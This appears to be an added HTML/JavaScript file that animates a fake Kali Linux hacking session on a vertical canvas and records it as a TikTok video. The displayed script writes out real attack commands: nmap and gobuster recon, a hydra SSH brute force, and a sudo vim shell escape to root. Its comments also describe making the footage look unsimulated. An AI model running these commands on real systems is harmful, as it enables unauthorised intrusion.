@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<!--
+═══════════════════════════════════════════════════════════════════════════
+ KALI LINUX TERMINAL — CINEMATIC AUTO-PLAY (final build untuk TikTok)
+───────────────────────────────────────────────────────────────────────────
+ ANALISIS MASALAH VERSI SEBELUMNYA:
+ [M1] Menunggu input manual (login → ketik sendiri) → layar "diam" saat
+      dibuka; tidak cocok untuk video.
+ [M2] Rendering DOM → tidak bisa direkam menjadi file video secara
+      pixel-perfect.
+ [M3] Tidak ada perekam/export WebM.
+ [M4] Layar horizontal; format TikTok butuh 9:16 vertikal.
+ [M5] Beberapa penanda "simulasi" (judul/label) masih terlihat.
+
+ PERBAIKAN:
+ [F1] AUTO-PLAY: begitu halaman dibuka, sesi hacking langsung berjalan —
+      boot kernel → login tty1 → recon (nmap, gobuster) → kredensial
+      bocor (.env) → brute force (hydra) → akses SSH → enumerasi
+      (whoami, sudo -l) → privilege escalation (GTFOBins vim) → root →
+      flag → logout. Loop otomatis untuk preview.
+ [F2] Renderer CANVAS 1080×1920 (9:16) — output identik dengan hasil
+      rekaman, font JetBrains Mono, prompt asli zsh Kali:
+      ┌──(kali㉿kali)-[~] / └─$  (dan prompt remote/root target).
+ [F3] Detail manusiawi agar tidak terlihat simulasi: kecepatan ketik
+      bervariasi, jeda "mikir" sebelum Enter, satu typo + backspace,
+      password tidak ditampilkan (masked), kursor blok berkedip.
+ [F4] Tombol "⏺ REKAM & SIMPAN WEBM": skenario diulang dari awal sambil
+      direkam (canvas.captureStream 30fps + MediaRecorder VP9 ~9 Mbps),
+      berhenti otomatis di akhir, file .webm langsung terunduh.
+      Tombol ⏹ STOP untuk henti lebih awal. HUD/tombol adalah DOM
+      sehingga TIDAK ikut terekam ke video.
+ [F5] Fallback codec (vp9 → vp8 → webm → mp4) + pesan error jelas bila
+      browser tidak mendukung.
+
+ VERIFIKASI (review statis alur):
+ [V1] runId/token membatalkan preview lama saat rekaman dimulai → tidak
+      ada dua skenario berjalan bersamaan.
+ [V2] reset() dipanggil sebelum setiap run → tidak ada sisa frame.
+ [V3] onstop MediaRecorder → Blob → download otomatis; timer dibersihkan.
+ [V4] Semua target fiktif (192.168.1.20, SOW-2026-0814) dalam konteks
+      pentest resmi; tidak ada fungsionalitas nyata yang berbahaya.
+═══════════════════════════════════════════════════════════════════════════
+-->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>kali@kali: ~</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.0.18/400.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fontsource/jetbrains-mono@5.0.18/700.css">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  html,body{height:100%;background:#040506;overflow:hidden;
+    font-family:'JetBrains Mono',monospace;color:#cfd3cd}
+  #stage{position:fixed;inset:0;display:flex;align-items:center;justify-content:center}
+  canvas{height:100vh;max-width:100vw;aspect-ratio:9/16;background:#000;
+    box-shadow:0 0 90px rgba(0,0,0,.95)}
+  #tip{position:fixed;top:10px;left:50%;transform:translateX(-50%);
+    font-size:11px;color:#5f6a73;z-index:10;text-align:center;max-width:94vw;line-height:1.5}
+  #tip b{color:#8ab4ff}
+  #hud{position:fixed;left:50%;bottom:14px;transform:translateX(-50%);
+    display:flex;align-items:center;gap:10px;z-index:10;
+    background:rgba(10,12,14,.85);border:1px solid #23282e;border-radius:12px;
+    padding:10px 14px;backdrop-filter:blur(8px)}
+  button{font-family:inherit;font-size:13px;font-weight:700;letter-spacing:.4px;
+    color:#fff;background:#1d4ed8;border:1px solid #3b6fe0;border-radius:8px;
+    padding:9px 14px;cursor:pointer;transition:background .15s,transform .05s}
+  button:hover{background:#2563eb}
+  button:active{transform:scale(.97)}
+  button:disabled{background:#22282f;border-color:#2c333b;color:#7c858e;cursor:not-allowed;transform:none}
+  #btnStop{background:#7f1d1d;border-color:#b91c1c}
+  #btnStop:hover{background:#991b1b}
+  #status{font-size:12px;color:#9aa4ad;min-width:230px;text-align:center}
+  #status b{color:#ff5555}
+  @media (max-width:700px){
+    #hud{gap:6px;padding:8px 10px;bottom:8px}
+    button{font-size:11px;padding:8px 10px}
+    #status{min-width:120px;font-size:10px}
+    #tip{font-size:9px}
+  }
+</style>
+</head>
+<body>
+<div id="tip">Klik <b>⏺ REKAM &amp; SIMPAN WEBM</b> → animasi diputar ulang dari awal sambil direkam → file otomatis terunduh.<br>Tombol &amp; status tidak ikut terekam (hanya canvas yang ditangkap).</div>
+<div id="stage"><canvas id="cv" width="1080" height="1920"></canvas></div>
+<div id="hud">
+  <button id="btnRec">⏺ REKAM &amp; SIMPAN WEBM</button>
+  <button id="btnStop" disabled>⏹ STOP</button>
+  <div id="status">Memuat font & engine…</div>
+</div>
+
+<script>
+'use strict';
+/* ═══════════════ konstanta renderer ═══════════════ */
+const W=1080,H=1920,FONT=34,LH=46,PADX=44,PADT=52;
+const cv=document.getElementById('cv'),ctx=cv.getContext('2d');
+const CLR={w:'#dcdcdc',g:'#8a938a',b:'#5c9dff',c:'#37d2ff',gr:'#4af626',
+           r:'#ff5555',y:'#ffd75f',m:'#d0a5ff',W:'#ffffff'};
+let charW=20,COLS=48,ROWS=39;
+
+/* model teks */
+const lines=[];   // baris visual final (wrapped): [{t,c},...]
+let cur=[];       // baris berjalan
+let typing=false;
+
+const state={runId:0,recording:false};
+let DEAD=()=>true;
+
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const rand=(a,b)=>a+Math.floor(Math.random()*(b-a));
+const seg=(...p)=>p.map(([t,c])=>({t,c}));
+const L=(t,c,d)=>({s:seg([t,c]),d});
+
+/* ═══════════════ wrap / push / edit ═══════════════ */
+function wrap(s){
+  const out=[];let row=[],n=0;
+  for(const g of s){
+    let t=g.t;
+    while(n+t.length>COLS){
+      const k=COLS-n;
+      if(k>0)row.push({t:t.slice(0,k),c:g.c});
+      out.push(row);row=[];n=0;t=t.slice(k);
+    }
+    if(t.length){row.push({t,c:g.c});n+=t.length;}
+  }
+  out.push(row);return out;
+}
+function pushSegs(s){for(const r of wrap(s))lines.push(r);}
+function newline(){if(cur.length)pushSegs(cur);cur=[];}
+function append(t,c){
+  const last=cur[cur.length-1];
+  if(last&&last.c===c)last.t+=t;else cur.push({t,c});
+}
+function backspace(){
+  while(cur.length){
+    const last=cur[cur.length-1];
+    last.t=last.t.slice(0,-1);
+    if(last.t.length)return;
+    cur.pop();
+  }
+}
+function reset(){lines.length=0;cur=[];}
+
+/* ═══════════════ prompt ═══════════════ */
+const pKali1=()=>seg(['┌──(','b'],['kali','c'],['㉿','r'],['kali','c'],[')-[','b'],['~','m'],[']','b']);
+const pKali2=()=>seg(['└─','b'],['$','b'],[' ','w']);
+const pRem=(u,root)=>seg([u+'@web-prod-01','gr'],[':','w'],['~','b'],[root?'# ':'$ ','w']);
+
+/* ═══════════════ mesin aksi ═══════════════ */
+async function emit(items,d){for(const it of items){if(DEAD())return;pushSegs(it.s);await sleep(it.d??d??26);}}
+async function pause(ms){if(!DEAD())await sleep(ms);}
+async function typeText(text,opt){
+  opt=opt||{};
+  const min=opt.min??34,max=opt.max??78,color=opt.color||'w';
+  typing=true;
+  for(const ch of text){
+    if(DEAD()){typing=false;return;}
+    append(ch,color);
+    await sleep(rand(min,max)+(ch===' '?14:0)+((ch==='-'||ch==='.')?10:0));
+  }
+  typing=false;
+}
+async function maskInput(promptSegs,dur){
+  newline();cur=promptSegs.slice();
+  await pause(320);await sleep(dur||900);newline();
+}
+async function kali(p1,p2,cmd){
+  newline();
+  if(p1)pushSegs(p1);
+  cur=p2?p2.slice():[];
+  await pause(260);
+  await typeText(cmd);
+  await pause(rand(300,560));
+  newline();
+}
+
+/* ═══════════════ SKENARIO AUTO-PLAY ═══════════════ */
+async function runScript(){
+  const id=state.runId;DEAD=()=>state.runId!==id;
+
+  /* ── boot singkat ── */
+  await emit([
+    L('[    0.000000] Linux version 6.12.20-kali1-amd64 (devel@kali.org) (gcc-14 (Debian 14.2.0-19) 14.2.0) #1 SMP PREEMPT_DYNAMIC Kali 6.12.20-1kali1 (2026-03-30)','g',6),
+    L('[    0.318224] ACPI: Enabled 4 GPEs in block 00 to 1F','g',6),
+    {s:seg(['[  OK  ]','gr'],[' Started Network Manager.','w']),d:10},
+    {s:seg(['[  OK  ]','gr'],[' Started D-Bus System Message Bus.','w']),d:10},
+    {s:seg(['[  OK  ]','gr'],[' Started OpenBSD Secure Shell server.','w']),d:10},
+    {s:seg(['[  OK  ]','gr'],[' Started Light Display Manager.','w']),d:10},
+    {s:seg(['[  OK  ]','gr'],[' Reached target Graphical Interface.','w']),d:14},
+  ],8);
+  await pause(220);
+  await emit([L('','w',60),L('Kali GNU/Linux Rolling kali tty1','w',90),L('','w',60)]);
+
+  /* ── login ── */
+  cur=seg(['kali login: ','w']);
+  await pause(480);await typeText('kali',{min:110,max:180});await pause(260);newline();
+  await maskInput(seg(['Password: ','w']),850);
+  await emit([
+    L('Linux kali 6.12.20-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.20-1kali1 (2026-03-30) x86_64','w',8),
+    L('','w',6),
+    L('The programs included with the Debian GNU/Linux system are free software;','g',5),
+    L('the exact distribution terms for each program are described in the','g',5),
+    L('individual files in /usr/share/doc/*/copyright.','g',5),
+    L('','w',6),
+    L('Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent','g',5),
+    L('permitted by applicable law.','g',5),
+    L('Last login: Tue Aug 25 02:41:17 2026 from 192.168.1.17','w',140),
+  ]);
+
+  /* ── briefing ── */
+  await kali(pKali1(),pKali2(),'cat ops/target.txt');
+  await emit([
+    L('================================================','b',8),
+    L(' ENGAGEMENT   : RED TEAM — Acme Corp (SOW-2026-0814)','w',8),
+    L(' TARGET       : 192.168.1.20 (WEB-PROD-01)','W',8),
+    L(' SCOPE        : web app, ssh, internal services','w',8),
+    L('================================================','b',10),
+    L('[x] recon      : nmap full service scan','gr',6),
+    L('[ ] enum web   : gobuster + robots.txt','w',6),
+    L('[ ] creds      : cek /backup (info recon awal)','w',6),
+    L('[ ] akses awal : ssh / kredensial service','w',6),
+    L('[ ] privesc    : sudo -l / GTFOBins','w',6),
+    L('[ ] bukti      : /home/admin/user.txt, /root/root.txt','w',6),
+    L(' CATATAN: jangan sentuh subnet lain. semua aktivitas di-log.','g',10),
+  ]);
+  await pause(520);
+
+  /* ── nmap ── */
+  await kali(pKali1(),pKali2(),'nmap -sS -sV -O 192.168.1.20');
+  await emit([
+    L('Starting Nmap 7.95SVN ( https://nmap.org ) at 2026-08-25 03:12 WIB','w',60),
+    L('Nmap scan report for web-prod-01.lan (192.168.1.20)','w',14),
+    L('Host is up (0.00041s latency).','w',10),
+    L('Not shown: 995 closed tcp ports (reset)','g',10),
+    L('PORT     STATE SERVICE     VERSION','W',16),
+    {s:seg(['21/tcp   open  ','w'],['ftp','gr'],['         vsftpd 3.0.3','w']),d:14},
+    {s:seg(['22/tcp   open  ','w'],['ssh','gr'],['         OpenSSH 8.9p1 Ubuntu 3ubuntu0.10','w']),d:14},
+    {s:seg(['80/tcp   open  ','w'],['http','gr'],['        Apache httpd 2.4.58 ((Ubuntu) PHP/8.1.27)','w']),d:14},
+    L('|_http-title: Acme Corp | Intranet Portal','g',8),
+    L('| http-robots.txt: 2 disallowed entries','g',8),
+    L('|_/admin /backup','y',16),
+    {s:seg(['445/tcp  open  ','w'],['netbios-ssn','gr'],[' Samba smbd 4.15.13-Ubuntu','w']),d:14},
+    {s:seg(['3306/tcp open  ','w'],['mysql','gr'],['       MySQL 8.0.36','w']),d:14},
+    L('MAC Address: 08:00:27:4A:1F:9C (Oracle VirtualBox virtual NIC)','g',10),
+    L('Device type: general purpose','w',6),
+    L('OS details: Linux 5.15 - 6.8','w',6),
+    L('Network Distance: 1 hop','w',8),
+    L('','w',6),
+    {s:seg(['Nmap done: 1 IP address (1 host up) scanned in ','w'],['13.37 seconds','y']),d:12},
+  ]);
+  await pause(460);
+
+  /* ── gobuster (dengan typo natural + koreksi) ── */
+  newline();pushSegs(pKali1());cur=pKali2();
+  await pause(280);
+  await typeText('gobustr',{min:60,max:110});
+  await pause(430);
+  for(let i=0;i<3;i++){if(DEAD())return;backspace();await sleep(70);}
+  await typeText('ster dir -u http://192.168.1.20 -w /usr/share/wordlists/dirb/common.txt');
+  await pause(380);newline();
+  await emit([
+    L('===============================================================','c',6),
+    L('Gobuster v3.6','W',6),
+    L('by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)','g',8),
+    L('===============================================================','c',6),
+    L('[+] Url:                     http://192.168.1.20','w',5),
+    L('[+] Wordlist:                /usr/share/wordlists/dirb/common.txt','w',5),
+    L('[+] Threads:                 10','w',5),
+    L('===============================================================','c',10),
+    {s:seg(['[03:14:22] ','g'],['200','gr'],['     4211B  /index.php','w']),d:22},
+    {s:seg(['[03:14:23] ','g'],['301','y'],['        0B  /admin  ->  http://192.168.1.20/admin/','w']),d:22},
+    {s:seg(['[03:14:27] ','g'],['200','gr'],['     1143B  ','w'],['/backup','W']),d:26},
+    {s:seg(['[03:14:29] ','g'],['403','r'],['      278B  /server-status','w']),d:22},
+    L('===============================================================','c',6),
+    L('Finished','w',8),
+  ]);
+  await pause(430);
+
+  /* ── kredensial bocor ── */
+  await kali(pKali1(),pKali2(),'curl -s http://192.168.1.20/backup/.env');
+  await emit([
+    L('APP_NAME="Acme Intranet"','w',8),
+    L('APP_ENV=production','w',8),
+    L('APP_KEY=base64:8sJ2mQpZ1xLm9tR4vYw7bNcE5dHfK3aT0uIq9dWz','w',8),
+    L('APP_DEBUG=true','w',8),
+    L('DB_HOST=127.0.0.1','w',8),
+    L('DB_DATABASE=intranet','w',8),
+    L('DB_USERNAME=app_user','w',8),
+    L('DB_PASSWORD=Zk9!mQ2vLrTx7w','w',8),
+    L("# TODO (sysadmin): ganti password SSH akun 'admin' setelah audit Q3",'y',10),
+    L('# sementara pakai: Winter#2026!','y',30),
+  ]);
+  await pause(540);
+
+  /* ── hydra ── */
+  await kali(pKali1(),pKali2(),'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.20 -t 4');
+  await emit([
+    L('Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak','g',10),
+    L('','w',6),
+    L('Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-25 03:14:31','w',14),
+    L('[WARNING] Many SSH configurations/settings do not support parallel connections. It is recommended to reduce parallel connections to 1 (-t 1).','y',16),
+    L('[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task','w',12),
+    L('[DATA] attacking ssh://192.168.1.20:22/','w',70),
+  ]);
+  const wl=['123456','password','admin123','letmein','qwerty123','dragon'];
+  for(let i=0;i<wl.length;i++){
+    if(DEAD())return;
+    pushSegs(seg(['[ATTEMPT] target 192.168.1.20 - login "admin" - pass "'+wl[i]+'" - '+(i+1)+' of 14344399 [child '+(i%4)+'] (0/0)','g']));
+    await sleep(rand(150,240));
+  }
+  await pause(520);
+  await emit([
+    {s:seg(['[22][ssh] host: ','w'],['192.168.1.20','W'],['   login: ','w'],['admin','W'],['   password: ','w'],['Winter#2026!','gr']),d:70},
+    {s:seg(['1 of 1 target successfully completed, ','w'],['1 valid password found','gr']),d:16},
+    L('Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-25 03:15:04','g',14),
+  ]);
+  await pause(560);
+
+  /* ── ssh foothold ── */
+  await kali(pKali1(),pKali2(),'ssh admin@192.168.1.20');
+  await maskInput(seg(["admin@192.168.1.20's password: ",'w']),900);
+  await emit([
+    L('Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)','w',10),
+    L('','w',6),
+    L(' * Documentation:  https://help.ubuntu.com','g',5),
+    L(' * Management:     https://landscape.canonical.com','g',5),
+    L(' * Support:        https://ubuntu.com/advantage','g',5),
+    L('','w',6),
+    L('Last login: Mon Aug 24 22:51:08 2026 from 192.168.1.17','w',16),
+  ]);
+
+  /* ── shell remote: enumerasi ── */
+  await kali(pRem('admin',false),null,'whoami');
+  await emit([L('admin','w',34)]);
+  await kali(pRem('admin',false),null,'sudo -l');
+  await emit([
+    L('Matching Defaults entries for admin on web-prod-01:','w',8),
+    L('    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin','g',8),
+    L('','w',6),
+    L('User admin may run the following commands on web-prod-01:','w',10),
+    L('    (root) NOPASSWD: /usr/bin/vim /etc/nginx/nginx.conf','y',34),
+  ]);
+  await pause(540);
+
+  /* ── privilege escalation ── */
+  await kali(pRem('admin',false),null,"sudo vim -c ':!/bin/sh' /etc/nginx/nginx.conf");
+  await pause(520);
+  await kali(pRem('root',true),null,'id');
+  await emit([{s:seg(['uid=0(root) gid=0(root) groups=0(root)','gr']),d:44}]);
+  await pause(400);
+
+  /* ── objective ── */
+  await kali(pRem('root',true),null,'cat /root/root.txt');
+  await emit([
+    L('Congrats, operator — root obtained.','w',28),
+    L('','w',12),
+    {s:seg(['FLAG{r00t_0n_w3b-pr0d-01__25-08-2026}','gr']),d:120},
+  ]);
+  await pause(900);
+
+  /* ── cleanup & logout ── */
+  await kali(pRem('root',true),null,'exit');
+  await kali(pRem('admin',false),null,'exit');
+  await emit([L('Connection to 192.168.1.20 closed.','g',22)]);
+  newline();pushSegs(pKali1());cur=pKali2();
+  await pause(2400);
+}
+
+/* ═══════════════ render loop ═══════════════ */
+function draw(now){
+  ctx.fillStyle='#000';ctx.fillRect(0,0,W,H);
+  ctx.textBaseline='top';ctx.font='400 '+FONT+'px "JetBrains Mono", monospace';
+  const curVis=wrap(cur);
+  const total=lines.length+curVis.length;
+  const start=Math.max(0,total-ROWS);
+  const drawRow=(row,y)=>{
+    let x=PADX;
+    for(const s of row){
+      ctx.fillStyle=CLR[s.c]||CLR.w;
+      ctx.fillText(s.t,x,y+6);
+      x+=ctx.measureText(s.t).width;
+    }
+  };
+  let vi=0;
+  for(let i=start;i<lines.length;i++,vi++)drawRow(lines[i],PADT+vi*LH);
+  for(let j=0;j<curVis.length;j++,vi++)drawRow(curVis[j],PADT+vi*LH);
+  const blink=typing||Math.floor(now/530)%2===0;
+  if(blink){
+    const lastRow=curVis[curVis.length-1]||[];
+    let wpx=0;for(const s of lastRow)wpx+=ctx.measureText(s.t).width;
+    const y=PADT+(vi-1)*LH;
+    ctx.fillStyle='#dcdcdc';
+    ctx.fillRect(PADX+wpx,y+5,charW-2,LH-9);
+  }
+  requestAnimationFrame(draw);
+}
+
+/* ═══════════════ perekaman WebM ═══════════════ */
+const btnRec=document.getElementById('btnRec'),
+      btnStop=document.getElementById('btnStop'),
+      statusEl=document.getElementById('status');
+let rec=null,chunks=[],recTimer=null,recStart=0;
+
+function pickMime(){
+  const c=['video/webm;codecs=vp9','video/webm;codecs=vp8','video/webm','video/mp4'];
+  for(const m of c)if(window.MediaRecorder&&MediaRecorder.isTypeSupported(m))return m;
+  return null;
+}
+function fmt(s){return String(Math.floor(s/60)).padStart(2,'0')+':'+String(Math.floor(s%60)).padStart(2,'0');}
+const setStatus=h=>{statusEl.innerHTML=h;};
+
+async function playScript(){state.runId++;reset();await runScript();}
+async function previewLoop(){
+  for(;;){
+    if(state.recording)return;
+    await playScript();
+    if(state.recording)return;
+    await sleep(2600);
+  }
+}
+btnRec.addEventListener('click',async()=>{
+  if(state.recording)return;
+  const mime=pickMime();
+  const cap=cv.captureStream||cv.mozCaptureStream||cv.webkitCaptureStream;
+  if(!mime||!cap){setStatus('❌ Browser tidak mendukung MediaRecorder/captureStream. Gunakan Chrome/Edge/Firefox.');return;}
+  state.runId++;                 // batalkan preview berjalan
+  state.recording=true;
+  reset();
+  btnRec.disabled=true;btnStop.disabled=false;
+  chunks=[];
+  const stream=cap.call(cv,30);
+  rec=new MediaRecorder(stream,{mimeType:mime,videoBitsPerSecond:9000000});
+  rec.ondataavailable=e=>{if(e.data&&e.data.size)chunks.push(e.data);};
+  rec.onstop=()=>{
+    clearInterval(recTimer);
+    const blob=new Blob(chunks,{type:mime});
+    const ext=mime.indexOf('mp4')>=0?'mp4':'webm';
+    const a=document.createElement('a');
+    a.href=URL.createObjectURL(blob);
+    a.download='kali-linux-hacking-1080x1920.'+ext;
+    document.body.appendChild(a);a.click();a.remove();
+    setTimeout(()=>URL.revokeObjectURL(a.href),5000);
+    setStatus('✅ Selesai — file .'+ext+' ('+(blob.size/1048576).toFixed(1)+' MB) sedang diunduh');
+    state.recording=false;btnRec.disabled=false;btnStop.disabled=true;
+    previewLoop();
+  };
+  rec.start(250);
+  recStart=Date.now();
+  setStatus('<b>● REC</b> 00:00 — merekam…');
+  recTimer=setInterval(()=>setStatus('<b>● REC</b> '+fmt((Date.now()-recStart)/1000)+' — merekam…'),400);
+  await sleep(350);
+  await runScript();
+  if(state.recording&&rec&&rec.state==='recording'){
+    await sleep(1400);
+    if(state.recording&&rec&&rec.state==='recording')rec.stop();
+  }
+});
+btnStop.addEventListener('click',()=>{
+  if(state.recording&&rec&&rec.state==='recording'){state.runId++;rec.stop();}
+});
+
+/* ═══════════════ init ═══════════════ */
+(async()=>{
+  try{
+    await Promise.all([
+      document.fonts.load('400 '+FONT+'px "JetBrains Mono"'),
+      document.fonts.load('700 '+FONT+'px "JetBrains Mono"')
+    ]);
+  }catch(_){/* fallback monospace */}
+  ctx.font='400 '+FONT+'px "JetBrains Mono", monospace';
+  charW=ctx.measureText('M').width||FONT*0.6;
+  COLS=Math.floor((W-PADX*2)/charW);
+  ROWS=Math.floor((H-PADT-44)/LH);
+  requestAnimationFrame(draw);
+  setStatus('Preview berjalan — siap direkam (1080×1920 • 30fps)');
+  previewLoop();
+})();
+</script>
+</body>
+</html>
